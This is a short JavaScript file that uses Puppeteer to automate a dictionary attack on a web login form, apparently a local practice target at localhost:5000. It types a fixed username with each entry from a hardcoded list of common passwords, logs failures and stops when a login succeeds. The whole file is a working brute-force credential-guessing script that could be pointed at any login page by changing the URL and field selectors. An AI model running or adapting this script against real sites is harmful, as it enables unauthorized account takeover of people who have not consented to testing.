const puppeteer = require('puppeteer')

const arrayPassword = [
    "aspirine",
    "456654",
    "socrates",
    "photo",
    "nopass",
    "parola",
    "megan",
    "lucy",
    "kenwood",
    "kenny",
    "imagine",
    "forgot",
    "cynthia",
    "blondes",
    "ashton",
    "aezakmi",
    "1234567q",
    "viper1",
    "terry",
    "sabine",
    "redalert",        
]

async function main() {
    try {
        const browser = await puppeteer.launch({ headless: false, slowMo: 200 })
        const page = await browser.newPage()
        for(let i = 0 ; i < arrayPassword.length; i++) {
            await page.goto("http://localhost:5000/")
            await page.type("#username", "3117410015")
            await page.type("#password", arrayPassword[i])
            await page.click('#btnSubmit')
            await page.waitForSelector("#login-result")
            let element = await page.$("#login-result")
            let value = await page.evaluate(el => el.textContent, element)
            if(value === "Login fail") {
                console.log("[FAIL]", arrayPassword[i])
            } else {
                console.log("[SUCCESSS]", arrayPassword[i])
                await page.close()
                await browser.close()
                console.log('[DONE]')
                break
            }
        }
    } catch (error) {
        console.log(error)
    }
}

main()